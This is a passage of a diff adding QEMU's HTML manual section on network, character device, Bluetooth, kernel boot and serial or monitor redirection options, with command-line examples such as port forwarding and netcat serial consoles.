+= 0 is the default). The NIC is an e1000 by default on the PC
+target. Optionally, the MAC address can be changed to <var>mac</var>, the
+device address set to <var>addr</var> (PCI cards only),
+and a <var>name</var> can be assigned for use in monitor commands. 
+Optionally, for PCI cards, you can specify the number <var>v</var> of MSI-X vectors
+that the card should have; this option currently only affects virtio cards; set
+<var>v</var> = 0 to disable MSI-X. If no <samp><span class="option">-net</span></samp> option is specified, a single
+NIC is created.  Qemu can emulate several different models of network card. 
+Valid values for <var>type</var> are
+<code>virtio</code>, <code>i82551</code>, <code>i82557b</code>, <code>i82559er</code>,
+<code>ne2k_pci</code>, <code>ne2k_isa</code>, <code>pcnet</code>, <code>rtl8139</code>,
+<code>e1000</code>, <code>smc91c111</code>, <code>lance</code> and <code>mcf_fec</code>. 
+Not all devices are supported on all targets.  Use -net nic,model=? 
+for a list of available devices for your target.
+
+     <br><dt><samp><span class="option">-net user[,</span><var>option</var><span class="option">][,</span><var>option</var><span class="option">][,...]</span></samp><dd>Use the user mode network stack which requires no administrator
+privilege to run. Valid options are:
+
+          <dl>
+<dt><samp><span class="option">vlan=</span><var>n</var></samp><dd>Connect user mode stack to VLAN <var>n</var> (<var>n</var> = 0 is the default).
+
+          <br><dt><samp><span class="option">name=</span><var>name</var></samp><dd>Assign symbolic name for use in monitor commands.
+
+          <br><dt><samp><span class="option">net=</span><var>addr</var><span class="option">[/</span><var>mask</var><span class="option">]</span></samp><dd>Set IP network address the guest will see. Optionally specify the netmask,
+either in the form a.b.c.d or as number of valid top-most bits. Default is
+10.0.2.0/8.
+
+          <br><dt><samp><span class="option">host=</span><var>addr</var></samp><dd>Specify the guest-visible address of the host. Default is the 2nd IP in the
+guest network, i.e. x.x.x.2.
+
+          <br><dt><samp><span class="option">restrict=y|yes|n|no</span></samp><dd>If this options is enabled, the guest will be isolated, i.e. it will not be
+able to contact the host and no guest IP packets will be routed over the host
+to the outside. This option does not affect explicitly set forwarding rule.
+
+          <br><dt><samp><span class="option">hostname=</span><var>name</var></samp><dd>Specifies the client hostname reported by the builtin DHCP server.
+
+          <br><dt><samp><span class="option">dhcpstart=</span><var>addr</var></samp><dd>Specify the first of the 16 IPs the built-in DHCP server can assign. Default
+is the 16th to 31st IP in the guest network, i.e. x.x.x.16 to x.x.x.31.
+
+          <br><dt><samp><span class="option">dns=</span><var>addr</var></samp><dd>Specify the guest-visible address of the virtual nameserver. The address must
+be different from the host address. Default is the 3rd IP in the guest network,
+i.e. x.x.x.3.
+
+          <br><dt><samp><span class="option">tftp=</span><var>dir</var></samp><dd>When using the user mode network stack, activate a built-in TFTP
+server. The files in <var>dir</var> will be exposed as the root of a TFTP server. 
+The TFTP client on the guest must be configured in binary mode (use the command
+<code>bin</code> of the Unix TFTP client).
+
+          <br><dt><samp><span class="option">bootfile=</span><var>file</var></samp><dd>When using the user mode network stack, broadcast <var>file</var> as the BOOTP
+filename. In conjunction with <samp><span class="option">tftp</span></samp>, this can be used to network boot
+a guest from a local directory.
+
+          <p>Example (using pxelinux):
+          <pre class="example">          qemu -hda linux.img -boot n -net user,tftp=/path/to/tftp/files,bootfile=/pxelinux.0
+</pre>
+          <br><dt><samp><span class="option">smb=</span><var>dir</var><span class="option">[,smbserver=</span><var>addr</var><span class="option">]</span></samp><dd>When using the user mode network stack, activate a built-in SMB
+server so that Windows OSes can access to the host files in <samp><var>dir</var></samp>
+transparently. The IP address of the SMB server can be set to <var>addr</var>. By
+default the 4th IP in the guest network is used, i.e. x.x.x.4.
+
+          <p>In the guest Windows OS, the line:
+          <pre class="example">          10.0.2.4 smbserver
+</pre>
+          <p>must be added in the file <samp><span class="file">C:\WINDOWS\LMHOSTS</span></samp> (for windows 9x/Me)
+or <samp><span class="file">C:\WINNT\SYSTEM32\DRIVERS\ETC\LMHOSTS</span></samp> (Windows NT/2000).
+
+          <p>Then <samp><var>dir</var></samp> can be accessed in <samp><span class="file">\smbserver\qemu</span></samp>.
+
+          <p>Note that a SAMBA server must be installed on the host OS in
+<samp><span class="file">/usr/sbin/smbd</span></samp>. QEMU was tested successfully with smbd versions from
+Red Hat 9, Fedora Core 3 and OpenSUSE 11.x.
+
+          <br><dt><samp><span class="option">hostfwd=[tcp|udp]:[</span><var>hostaddr</var><span class="option">]:</span><var>hostport</var><span class="option">-[</span><var>guestaddr</var><span class="option">]:</span><var>guestport</var></samp><dd>Redirect incoming TCP or UDP connections to the host port <var>hostport</var> to
+the guest IP address <var>guestaddr</var> on guest port <var>guestport</var>. If
+<var>guestaddr</var> is not specified, its value is x.x.x.15 (default first address
+given by the built-in DHCP server). By specifying <var>hostaddr</var>, the rule can
+be bound to a specific host interface. If no connection type is set, TCP is
+used. This option can be given multiple times.
+
+          <p>For example, to redirect host X11 connection from screen 1 to guest
+screen 0, use the following:
+
+          <pre class="example">          # on the host
+          qemu -net user,hostfwd=tcp:127.0.0.1:6001-:6000 [...]
+          # this host xterm should open in the guest X11 server
+          xterm -display :1
+</pre>
+          <p>To redirect telnet connections from host port 5555 to telnet port on
+the guest, use the following:
+
+          <pre class="example">          # on the host
+          qemu -net user,hostfwd=tcp::5555-:23 [...]
+          telnet localhost 5555
+</pre>
+          <p>Then when you use on the host <code>telnet localhost 5555</code>, you
+connect to the guest telnet server.
+
+          <br><dt><samp><span class="option">guestfwd=[tcp]:</span><var>server</var><span class="option">:</span><var>port</var><span class="option">-</span><var>dev</var></samp><dd>Forward guest TCP connections to the IP address <var>server</var> on port <var>port</var>
+to the character device <var>dev</var>. This option can be given multiple times.
+
+     </dl>
+
+     <p>Note: Legacy stand-alone options -tftp, -bootp, -smb and -redir are still
+processed and applied to -net user. Mixing them with the new configuration
+syntax gives undefined results. Their use for new applications is discouraged
+as they will be removed from future versions.
+
+     <br><dt><samp><span class="option">-net tap[,vlan=</span><var>n</var><span class="option">][,name=</span><var>name</var><span class="option">][,fd=</span><var>h</var><span class="option">][,ifname=</span><var>name</var><span class="option">] [,script=</span><var>file</var><span class="option">][,downscript=</span><var>dfile</var><span class="option">]</span></samp><dd>Connect the host TAP network interface <var>name</var> to VLAN <var>n</var>, use
+the network script <var>file</var> to configure it and the network script
+<var>dfile</var> to deconfigure it. If <var>name</var> is not provided, the OS
+automatically provides one. <samp><span class="option">fd</span></samp>=<var>h</var> can be used to specify
+the handle of an already opened host TAP interface. The default network
+configure script is <samp><span class="file">/etc/qemu-ifup</span></samp> and the default network
+deconfigure script is <samp><span class="file">/etc/qemu-ifdown</span></samp>. Use <samp><span class="option">script=no</span></samp>
+or <samp><span class="option">downscript=no</span></samp> to disable script execution. Example:
+
+     <pre class="example">     qemu linux.img -net nic -net tap
+</pre>
+     <p>More complicated example (two NICs, each one connected to a TAP device)
+     <pre class="example">     qemu linux.img -net nic,vlan=0 -net tap,vlan=0,ifname=tap0 \
+     -net nic,vlan=1 -net tap,vlan=1,ifname=tap1
+</pre>
+     <br><dt><samp><span class="option">-net socket[,vlan=</span><var>n</var><span class="option">][,name=</span><var>name</var><span class="option">][,fd=</span><var>h</var><span class="option">] [,listen=[</span><var>host</var><span class="option">]:</span><var>port</var><span class="option">][,connect=</span><var>host</var><span class="option">:</span><var>port</var><span class="option">]</span></samp><dd>
+Connect the VLAN <var>n</var> to a remote VLAN in another QEMU virtual
+machine using a TCP socket connection. If <samp><span class="option">listen</span></samp> is
+specified, QEMU waits for incoming connections on <var>port</var>
+(<var>host</var> is optional). <samp><span class="option">connect</span></samp> is used to connect to
+another QEMU instance using the <samp><span class="option">listen</span></samp> option. <samp><span class="option">fd</span></samp>=<var>h</var>
+specifies an already opened TCP socket.
+
+     <p>Example:
+     <pre class="example">     # launch a first QEMU instance
+     qemu linux.img -net nic,macaddr=52:54:00:12:34:56 \
+     -net socket,listen=:1234
+     # connect the VLAN 0 of this instance to the VLAN 0
+     # of the first instance
+     qemu linux.img -net nic,macaddr=52:54:00:12:34:57 \
+     -net socket,connect=127.0.0.1:1234
+</pre>
+     <br><dt><samp><span class="option">-net socket[,vlan=</span><var>n</var><span class="option">][,name=</span><var>name</var><span class="option">][,fd=</span><var>h</var><span class="option">][,mcast=</span><var>maddr</var><span class="option">:</span><var>port</var><span class="option">[,localaddr=</span><var>addr</var><span class="option">]]</span></samp><dd>
+Create a VLAN <var>n</var> shared with another QEMU virtual
+machines using a UDP multicast socket, effectively making a bus for
+every QEMU with same multicast address <var>maddr</var> and <var>port</var>. 
+NOTES:
+          <ol type=1 start=1>
+<li>Several QEMU can be running on different hosts and share same bus (assuming
+correct multicast setup for these hosts). 
+<li>mcast support is compatible with User Mode Linux (argument <samp><span class="option">eth</span><var>N</var><span class="option">=mcast</span></samp>), see
+<a href="http://user-mode-linux.sf.net">http://user-mode-linux.sf.net</a>. 
+<li>Use <samp><span class="option">fd=h</span></samp> to specify an already opened UDP multicast socket.
+          </ol>
+
+     <p>Example:
+     <pre class="example">     # launch one QEMU instance
+     qemu linux.img -net nic,macaddr=52:54:00:12:34:56 \
+     -net socket,mcast=230.0.0.1:1234
+     # launch another QEMU instance on same "bus"
+     qemu linux.img -net nic,macaddr=52:54:00:12:34:57 \
+     -net socket,mcast=230.0.0.1:1234
+     # launch yet another QEMU instance on same "bus"
+     qemu linux.img -net nic,macaddr=52:54:00:12:34:58 \
+     -net socket,mcast=230.0.0.1:1234
+</pre>
+     <p>Example (User Mode Linux compat.):
+     <pre class="example">     # launch QEMU instance (note mcast address selected
+     # is UML's default)
+     qemu linux.img -net nic,macaddr=52:54:00:12:34:56 \
+     -net socket,mcast=239.192.168.1:1102
+     # launch UML
+     /path/to/linux ubd0=/path/to/root_fs eth0=mcast
+</pre>
+     <p>Example (send packets from host's 1.2.3.4):
+     <pre class="example">     qemu linux.img -net nic,macaddr=52:54:00:12:34:56 \
+     -net socket,mcast=239.192.168.1:1102,localaddr=1.2.3.4
+</pre>
+     <br><dt><samp><span class="option">-net vde[,vlan=</span><var>n</var><span class="option">][,name=</span><var>name</var><span class="option">][,sock=</span><var>socketpath</var><span class="option">] [,port=</span><var>n</var><span class="option">][,group=</span><var>groupname</var><span class="option">][,mode=</span><var>octalmode</var><span class="option">]</span></samp><dd>Connect VLAN <var>n</var> to PORT <var>n</var> of a vde switch running on host and
+listening for incoming connections on <var>socketpath</var>. Use GROUP <var>groupname</var>
+and MODE <var>octalmode</var> to change default ownership and permissions for
+communication port. This option is available only if QEMU has been compiled
+with vde support enabled.
+
+     <p>Example:
+     <pre class="example">     # launch vde switch
+     vde_switch -F -sock /tmp/myswitch
+     # launch QEMU instance
+     qemu linux.img -net nic -net vde,sock=/tmp/myswitch
+</pre>
+     <br><dt><samp><span class="option">-net dump[,vlan=</span><var>n</var><span class="option">][,file=</span><var>file</var><span class="option">][,len=</span><var>len</var><span class="option">]</span></samp><dd>Dump network traffic on VLAN <var>n</var> to file <var>file</var> (<samp><span class="file">qemu-vlan0.pcap</span></samp> by default). 
+At most <var>len</var> bytes (64k by default) per packet are stored. The file format is
+libpcap, so it can be analyzed with tools such as tcpdump or Wireshark.
+
+     <br><dt><samp><span class="option">-net none</span></samp><dd>Indicate that no network devices should be configured. It is used to
+override the default configuration (<samp><span class="option">-net nic -net user</span></samp>) which
+is activated if no <samp><span class="option">-net</span></samp> options are provided.
+
+</dl>
+
+<p>Character device options:
+
+<p>The general form of a character device option is:
+     <dl>
+<dt><samp><span class="option">-chardev </span><var>backend</var><span class="option"> ,id=</span><var>id</var><span class="option"> [,mux=on|off] [,</span><var>options</var><span class="option">]</span></samp><dd><a name="index-g_t_002dchardev-65"></a>Backend is one of:
+<samp><span class="option">null</span></samp>,
+<samp><span class="option">socket</span></samp>,
+<samp><span class="option">udp</span></samp>,
+<samp><span class="option">msmouse</span></samp>,
+<samp><span class="option">vc</span></samp>,
+<samp><span class="option">file</span></samp>,
+<samp><span class="option">pipe</span></samp>,
+<samp><span class="option">console</span></samp>,
+<samp><span class="option">serial</span></samp>,
+<samp><span class="option">pty</span></samp>,
+<samp><span class="option">stdio</span></samp>,
+<samp><span class="option">braille</span></samp>,
+<samp><span class="option">tty</span></samp>,
+<samp><span class="option">parport</span></samp>,
+<samp><span class="option">spicevmc</span></samp>. 
+The specific backend will determine the applicable options.
+
+     <p>All devices must have an id, which can be any string up to 127 characters long. 
+It is used to uniquely identify this device in other command line directives.
+
+     <p>A character device may be used in multiplexing mode by multiple front-ends. 
+The key sequence of &lt;Control-a&gt; and &lt;c&gt; will rotate the input focus
+between attached front-ends. Specify <samp><span class="option">mux=on</span></samp> to enable this mode.
+
+     <p>Options to each backend are described below.
+
+     <br><dt><samp><span class="option">-chardev null ,id=</span><var>id</var></samp><dd>A void device. This device will not emit any data, and will drop any data it
+receives. The null backend does not take any options.
+
+     <br><dt><samp><span class="option">-chardev socket ,id=</span><var>id</var><span class="option"> [</span><var>TCP options</var><span class="option"> or </span><var>unix options</var><span class="option">] [,server] [,nowait] [,telnet]</span></samp><dd>
+Create a two-way stream socket, which can be either a TCP or a unix socket. A
+unix socket will be created if <samp><span class="option">path</span></samp> is specified. Behaviour is
+undefined if TCP options are specified for a unix socket.
+
+     <p><samp><span class="option">server</span></samp> specifies that the socket shall be a listening socket.
+
+     <p><samp><span class="option">nowait</span></samp> specifies that QEMU should not block waiting for a client to
+connect to a listening socket.
+
+     <p><samp><span class="option">telnet</span></samp> specifies that traffic on the socket should interpret telnet
+escape sequences.
+
+     <p>TCP and unix socket options are given below:
+
+          <dl>
+<dt><samp><span class="option">TCP options: port=</span><var>port</var><span class="option"> [,host=</span><var>host</var><span class="option">] [,to=</span><var>to</var><span class="option">] [,ipv4] [,ipv6] [,nodelay]</span></samp><dd>
+<samp><span class="option">host</span></samp> for a listening socket specifies the local address to be bound. 
+For a connecting socket species the remote host to connect to. <samp><span class="option">host</span></samp> is
+optional for listening sockets. If not specified it defaults to <code>0.0.0.0</code>.
+
+          <p><samp><span class="option">port</span></samp> for a listening socket specifies the local port to be bound. For a
+connecting socket specifies the port on the remote host to connect to. 
+<samp><span class="option">port</span></samp> can be given as either a port number or a service name. 
+<samp><span class="option">port</span></samp> is required.
+
+          <p><samp><span class="option">to</span></samp> is only relevant to listening sockets. If it is specified, and
+<samp><span class="option">port</span></samp> cannot be bound, QEMU will attempt to bind to subsequent ports up
+to and including <samp><span class="option">to</span></samp> until it succeeds. <samp><span class="option">to</span></samp> must be specified
+as a port number.
+
+          <p><samp><span class="option">ipv4</span></samp> and <samp><span class="option">ipv6</span></samp> specify that either IPv4 or IPv6 must be used. 
+If neither is specified the socket may use either protocol.
+
+          <p><samp><span class="option">nodelay</span></samp> disables the Nagle algorithm.
+
+          <br><dt><samp><span class="option">unix options: path=</span><var>path</var></samp><dd>
+<samp><span class="option">path</span></samp> specifies the local path of the unix socket. <samp><span class="option">path</span></samp> is
+required.
+
+     </dl>
+
+     <br><dt><samp><span class="option">-chardev udp ,id=</span><var>id</var><span class="option"> [,host=</span><var>host</var><span class="option">] ,port=</span><var>port</var><span class="option"> [,localaddr=</span><var>localaddr</var><span class="option">] [,localport=</span><var>localport</var><span class="option">] [,ipv4] [,ipv6]</span></samp><dd>
+Sends all traffic from the guest to a remote host over UDP.
+
+     <p><samp><span class="option">host</span></samp> specifies the remote host to connect to. If not specified it
+defaults to <code>localhost</code>.
+
+     <p><samp><span class="option">port</span></samp> specifies the port on the remote host to connect to. <samp><span class="option">port</span></samp>
+is required.
+
+     <p><samp><span class="option">localaddr</span></samp> specifies the local address to bind to. If not specified it
+defaults to <code>0.0.0.0</code>.
+
+     <p><samp><span class="option">localport</span></samp> specifies the local port to bind to. If not specified any
+available local port will be used.
+
+     <p><samp><span class="option">ipv4</span></samp> and <samp><span class="option">ipv6</span></samp> specify that either IPv4 or IPv6 must be used. 
+If neither is specified the device may use either protocol.
+
+     <br><dt><samp><span class="option">-chardev msmouse ,id=</span><var>id</var></samp><dd>
+Forward QEMU's emulated msmouse events to the guest. <samp><span class="option">msmouse</span></samp> does not
+take any options.
+
+     <br><dt><samp><span class="option">-chardev vc ,id=</span><var>id</var><span class="option"> [[,width=</span><var>width</var><span class="option">] [,height=</span><var>height</var><span class="option">]] [[,cols=</span><var>cols</var><span class="option">] [,rows=</span><var>rows</var><span class="option">]]</span></samp><dd>
+Connect to a QEMU text console. <samp><span class="option">vc</span></samp> may optionally be given a specific
+size.
+
+     <p><samp><span class="option">width</span></samp> and <samp><span class="option">height</span></samp> specify the width and height respectively of
+the console, in pixels.
+
+     <p><samp><span class="option">cols</span></samp> and <samp><span class="option">rows</span></samp> specify that the console be sized to fit a text
+console with the given dimensions.
+
+     <br><dt><samp><span class="option">-chardev file ,id=</span><var>id</var><span class="option"> ,path=</span><var>path</var></samp><dd>
+Log all traffic received from the guest to a file.
+
+     <p><samp><span class="option">path</span></samp> specifies the path of the file to be opened. This file will be
+created if it does not already exist, and overwritten if it does. <samp><span class="option">path</span></samp>
+is required.
+
+     <br><dt><samp><span class="option">-chardev pipe ,id=</span><var>id</var><span class="option"> ,path=</span><var>path</var></samp><dd>
+Create a two-way connection to the guest. The behaviour differs slightly between
+Windows hosts and other hosts:
+
+     <p>On Windows, a single duplex pipe will be created at
+<samp><span class="file">\.pipe\</span><samp><span class="option">path</span></samp></samp>.
+
+     <p>On other hosts, 2 pipes will be created called <samp><samp><span class="option">path</span></samp><span class="file">.in</span></samp> and
+<samp><samp><span class="option">path</span></samp><span class="file">.out</span></samp>. Data written to <samp><samp><span class="option">path</span></samp><span class="file">.in</span></samp> will be
+received by the guest. Data written by the guest can be read from
+<samp><samp><span class="option">path</span></samp><span class="file">.out</span></samp>. QEMU will not create these fifos, and requires them to
+be present.
+
+     <p><samp><span class="option">path</span></samp> forms part of the pipe path as described above. <samp><span class="option">path</span></samp> is
+required.
+
+     <br><dt><samp><span class="option">-chardev console ,id=</span><var>id</var></samp><dd>
+Send traffic from the guest to QEMU's standard output. <samp><span class="option">console</span></samp> does not
+take any options.
+
+     <p><samp><span class="option">console</span></samp> is only available on Windows hosts.
+
+     <br><dt><samp><span class="option">-chardev serial ,id=</span><var>id</var><span class="option"> ,path=</span><samp><span class="option">path</span></samp></samp><dd>
+Send traffic from the guest to a serial device on the host.
+
+     <p><samp><span class="option">serial</span></samp> is
+only available on Windows hosts.
+
+     <p><samp><span class="option">path</span></samp> specifies the name of the serial device to open.
+
+     <br><dt><samp><span class="option">-chardev pty ,id=</span><var>id</var></samp><dd>
+Create a new pseudo-terminal on the host and connect to it. <samp><span class="option">pty</span></samp> does
+not take any options.
+
+     <p><samp><span class="option">pty</span></samp> is not available on Windows hosts.
+
+     <br><dt><samp><span class="option">-chardev stdio ,id=</span><var>id</var><span class="option"> [,signal=on|off]</span></samp><dd>Connect to standard input and standard output of the qemu process.
+
+     <p><samp><span class="option">signal</span></samp> controls if signals are enabled on the terminal, that includes
+exiting QEMU with the key sequence &lt;Control-c&gt;. This option is enabled by
+default, use <samp><span class="option">signal=off</span></samp> to disable it.
+
+     <p><samp><span class="option">stdio</span></samp> is not available on Windows hosts.
+
+     <br><dt><samp><span class="option">-chardev braille ,id=</span><var>id</var></samp><dd>
+Connect to a local BrlAPI server. <samp><span class="option">braille</span></samp> does not take any options.
+
+     <br><dt><samp><span class="option">-chardev tty ,id=</span><var>id</var><span class="option"> ,path=</span><var>path</var></samp><dd>
+Connect to a local tty device.
+
+     <p><samp><span class="option">tty</span></samp> is only available on Linux, Sun, FreeBSD, NetBSD, OpenBSD and
+DragonFlyBSD hosts.
+
+     <p><samp><span class="option">path</span></samp> specifies the path to the tty. <samp><span class="option">path</span></samp> is required.
+
+     <br><dt><samp><span class="option">-chardev parport ,id=</span><var>id</var><span class="option"> ,path=</span><var>path</var></samp><dd>
+<samp><span class="option">parport</span></samp> is only available on Linux, FreeBSD and DragonFlyBSD hosts.
+
+     <p>Connect to a local parallel port.
+
+     <p><samp><span class="option">path</span></samp> specifies the path to the parallel port device. <samp><span class="option">path</span></samp> is
+required.
+
+     <p>#if defined(CONFIG_SPICE)
+<br><dt><samp><span class="option">-chardev spicevmc ,id=</span><var>id</var><span class="option"> ,debug=</span><var>debug</var><span class="option">, name=</span><var>name</var></samp><dd>
+<samp><span class="option">debug</span></samp> debug level for spicevmc
+
+     <p><samp><span class="option">name</span></samp> name of spice channel to connect to
+
+     <p>Connect to a spice virtual machine channel, such as vdiport. 
+#endif
+
+</dl>
+
+<p>Bluetooth(R) options:
+     <dl>
+<dt><samp><span class="option">-bt hci[...]</span></samp><dd><a name="index-g_t_002dbt-66"></a>Defines the function of the corresponding Bluetooth HCI.  -bt options
+are matched with the HCIs present in the chosen machine type.  For
+example when emulating a machine with only one HCI built into it, only
+the first <code>-bt hci[...]</code> option is valid and defines the HCI's
+logic.  The Transport Layer is decided by the machine type.  Currently
+the machines <code>n800</code> and <code>n810</code> have one HCI and all other
+machines have none.
+
+     <p><a name="bt_002dhcis"></a>The following three types are recognized:
+
+          <dl>
+<dt><samp><span class="option">-bt hci,null</span></samp><dd>(default) The corresponding Bluetooth HCI assumes no internal logic
+and will not respond to any HCI commands or emit events.
+
+          <br><dt><samp><span class="option">-bt hci,host[:</span><var>id</var><span class="option">]</span></samp><dd>(<code>bluez</code> only) The corresponding HCI passes commands / events
+to / from the physical HCI identified by the name <var>id</var> (default:
+<code>hci0</code>) on the computer running QEMU.  Only available on <code>bluez</code>
+capable systems like Linux.
+
+          <br><dt><samp><span class="option">-bt hci[,vlan=</span><var>n</var><span class="option">]</span></samp><dd>Add a virtual, standard HCI that will participate in the Bluetooth
+scatternet <var>n</var> (default <code>0</code>).  Similarly to <samp><span class="option">-net</span></samp>
+VLANs, devices inside a bluetooth network <var>n</var> can only communicate
+with other devices in the same network (scatternet). 
+</dl>
+
+     <br><dt><samp><span class="option">-bt vhci[,vlan=</span><var>n</var><span class="option">]</span></samp><dd>(Linux-host only) Create a HCI in scatternet <var>n</var> (default 0) attached
+to the host bluetooth stack instead of to the emulated target.  This
+allows the host and target machines to participate in a common scatternet
+and communicate.  Requires the Linux <code>vhci</code> driver installed.  Can
+be used as following:
+
+     <pre class="example">     qemu [...OPTIONS...] -bt hci,vlan=5 -bt vhci,vlan=5
+</pre>
+     <br><dt><samp><span class="option">-bt device:</span><var>dev</var><span class="option">[,vlan=</span><var>n</var><span class="option">]</span></samp><dd>Emulate a bluetooth device <var>dev</var> and place it in network <var>n</var>
+(default <code>0</code>).  QEMU can only emulate one type of bluetooth devices
+currently:
+
+          <dl>
+<dt><samp><span class="option">keyboard</span></samp><dd>Virtual wireless keyboard implementing the HIDP bluetooth profile. 
+</dl>
+     </dl>
+
+<p>Linux/Multiboot boot specific:
+
+<p>When using these options, you can use a given Linux or Multiboot
+kernel without installing it in the disk image. It can be useful
+for easier testing of various kernels.
+
+     <dl>
+<dt><samp><span class="option">-kernel </span><var>bzImage</var></samp><dd><a name="index-g_t_002dkernel-67"></a>Use <var>bzImage</var> as kernel image. The kernel can be either a Linux kernel
+or in multiboot format. 
+<br><dt><samp><span class="option">-append </span><var>cmdline</var></samp><dd><a name="index-g_t_002dappend-68"></a>Use <var>cmdline</var> as kernel command line
+<br><dt><samp><span class="option">-initrd </span><var>file</var></samp><dd><a name="index-g_t_002dinitrd-69"></a>Use <var>file</var> as initial ram disk.
+
+     <br><dt><samp><span class="option">-initrd "</span><var>file1</var><span class="option"> arg=foo,</span><var>file2</var><span class="option">"</span></samp><dd>
+This syntax is only available with multiboot.
+
+     <p>Use <var>file1</var> and <var>file2</var> as modules and pass arg=foo as parameter to the
+first module. 
+</dl>
+
+<p>Debug/Expert options:
+     <dl>
+<dt><samp><span class="option">-serial </span><var>dev</var></samp><dd><a name="index-g_t_002dserial-70"></a>Redirect the virtual serial port to host character device
+<var>dev</var>. The default device is <code>vc</code> in graphical mode and
+<code>stdio</code> in non graphical mode.
+
+     <p>This option can be used several times to simulate up to 4 serial
+ports.
+
+     <p>Use <code>-serial none</code> to disable all serial ports.
+
+     <p>Available character devices are:
+          <dl>
+<dt><samp><span class="option">vc[:</span><var>W</var><span class="option">x</span><var>H</var><span class="option">]</span></samp><dd>Virtual console. Optionally, a width and height can be given in pixel with
+          <pre class="example">          vc:800x600
+</pre>
+          <p>It is also possible to specify width or height in characters:
+          <pre class="example">          vc:80Cx24C
+</pre>
+          <br><dt><samp><span class="option">pty</span></samp><dd>[Linux only] Pseudo TTY (a new PTY is automatically allocated)
+<br><dt><samp><span class="option">none</span></samp><dd>No device is allocated. 
+<br><dt><samp><span class="option">null</span></samp><dd>void device
+<br><dt><samp><span class="option">/dev/XXX</span></samp><dd>[Linux only] Use host tty, e.g. <samp><span class="file">/dev/ttyS0</span></samp>. The host serial port
+parameters are set according to the emulated ones. 
+<br><dt><samp><span class="option">/dev/parport</span><var>N</var></samp><dd>[Linux only, parallel port only] Use host parallel port
+<var>N</var>. Currently SPP and EPP parallel port features can be used. 
+<br><dt><samp><span class="option">file:</span><var>filename</var></samp><dd>Write output to <var>filename</var>. No character can be read. 
+<br><dt><samp><span class="option">stdio</span></samp><dd>[Unix only] standard input/output
+<br><dt><samp><span class="option">pipe:</span><var>filename</var></samp><dd>name pipe <var>filename</var>
+<br><dt><samp><span class="option">COM</span><var>n</var></samp><dd>[Windows only] Use host serial port <var>n</var>
+<br><dt><samp><span class="option">udp:[</span><var>remote_host</var><span class="option">]:</span><var>remote_port</var><span class="option">[@[</span><var>src_ip</var><span class="option">]:</span><var>src_port</var><span class="option">]</span></samp><dd>This implements UDP Net Console. 
+When <var>remote_host</var> or <var>src_ip</var> are not specified
+they default to <code>0.0.0.0</code>. 
+When not using a specified <var>src_port</var> a random port is automatically chosen.
+
+          <p>If you just want a simple readonly console you can use <code>netcat</code> or
+<code>nc</code>, by starting qemu with: <code>-serial udp::4555</code> and nc as:
+<code>nc -u -l -p 4555</code>. Any time qemu writes something to that port it
+will appear in the netconsole session.
+
+          <p>If you plan to send characters back via netconsole or you want to stop
+and start qemu a lot of times, you should have qemu use the same
+source port each time by using something like <code>-serial
+udp::4555@:4556</code> to qemu. Another approach is to use a patched
+version of netcat which can listen to a TCP port and send and receive
+characters via udp.  If you have a patched version of netcat which
+activates telnet remote echo and single char transfer, then you can
+use the following options to step up a netcat redirector to allow
+telnet on port 5555 to access the qemu port.
+               <dl>
+<dt><code>Qemu Options:</code><dd>-serial udp::4555@:4556
+<br><dt><code>netcat options:</code><dd>-u -P 4555 -L 0.0.0.0:4556 -t -p 5555 -I -T
+<br><dt><code>telnet options:</code><dd>localhost 5555
+</dl>
+
+          <br><dt><samp><span class="option">tcp:[</span><var>host</var><span class="option">]:</span><var>port</var><span class="option">[,</span><var>server</var><span class="option">][,nowait][,nodelay]</span></samp><dd>The TCP Net Console has two modes of operation.  It can send the serial
+I/O to a location or wait for a connection from a location.  By default
+the TCP Net Console is sent to <var>host</var> at the <var>port</var>.  If you use
+the <var>server</var> option QEMU will wait for a client socket application
+to connect to the port before continuing, unless the <code>nowait</code>
+option was specified.  The <code>nodelay</code> option disables the Nagle buffering
+algorithm.  If <var>host</var> is omitted, 0.0.0.0 is assumed. Only
+one TCP connection at a time is accepted. You can use <code>telnet</code> to
+connect to the corresponding character device.
+               <dl>
+<dt><code>Example to send tcp console to 192.168.0.2 port 4444</code><dd>-serial tcp:192.168.0.2:4444
+<br><dt><code>Example to listen and wait on port 4444 for connection</code><dd>-serial tcp::4444,server
+<br><dt><code>Example to not wait and listen on ip 192.168.0.100 port 4444</code><dd>-serial tcp:192.168.0.100:4444,server,nowait
+</dl>
+
+          <br><dt><samp><span class="option">telnet:</span><var>host</var><span class="option">:</span><var>port</var><span class="option">[,server][,nowait][,nodelay]</span></samp><dd>The telnet protocol is used instead of raw tcp sockets.  The options
+work the same as if you had specified <code>-serial tcp</code>.  The
+difference is that the port acts like a telnet server or client using
+telnet option negotiation.  This will also allow you to send the
+MAGIC_SYSRQ sequence if you use a telnet that supports sending the break
+sequence.  Typically in unix telnet you do it with Control-] and then
+type "send break" followed by pressing the enter key.
+
+          <br><dt><samp><span class="option">unix:</span><var>path</var><span class="option">[,server][,nowait]</span></samp><dd>A unix domain socket is used instead of a tcp socket.  The option works the
+same as if you had specified <code>-serial tcp</code> except the unix domain socket
+<var>path</var> is used for connections.
+
+          <br><dt><samp><span class="option">mon:</span><var>dev_string</var></samp><dd>This is a special option to allow the monitor to be multiplexed onto
+another serial port.  The monitor is accessed with key sequence of
+&lt;Control-a&gt; and then pressing &lt;c&gt;. See monitor access
+<a href="#pcsys_005fkeys">pcsys_keys</a> in the -nographic section for more keys. 
+<var>dev_string</var> should be any one of the serial devices specified
+above.  An example to multiplex the monitor onto a telnet server
+listening on port 4444 would be:
+               <dl>
+<dt><code>-serial mon:telnet::4444,server,nowait</code><dd></dl>
+
+          <br><dt><samp><span class="option">braille</span></samp><dd>Braille device.  This will use BrlAPI to display the braille output on a real
+or fake device.
+
+          <br><dt><samp><span class="option">msmouse</span></samp><dd>Three button serial mouse. Configure the guest to use Microsoft protocol. 
+</dl>
+     <br><dt><samp><span class="option">-parallel </span><var>dev</var></samp><dd><a name="index-g_t_002dparallel-71"></a>Redirect the virtual parallel port to host device <var>dev</var> (same
+devices as the serial port). On Linux hosts, <samp><span class="file">/dev/parportN</span></samp> can
+be used to use hardware devices connected on the corresponding host
+parallel port.
+
+     <p>This option can be used several times to simulate up to 3 parallel
+ports.
+
+     <p>Use <code>-parallel none</code> to disable all parallel ports. 
+<br><dt><samp><span class="option">-monitor </span><var>dev</var></samp><dd><a name="index-g_t_002dmonitor-72"></a>Redirect the monitor to host device <var>dev</var> (same devices as the
+serial port). 
+The default device is <code>vc</code> in graphical mode and <code>stdio</code> in
+non graphical mode. 
+<br><dt><samp><span class="option">-qmp </span><var>dev</var></samp><dd><a name="index-g_t_002dqmp-73"></a>Like -monitor but opens in 'control' mode. 
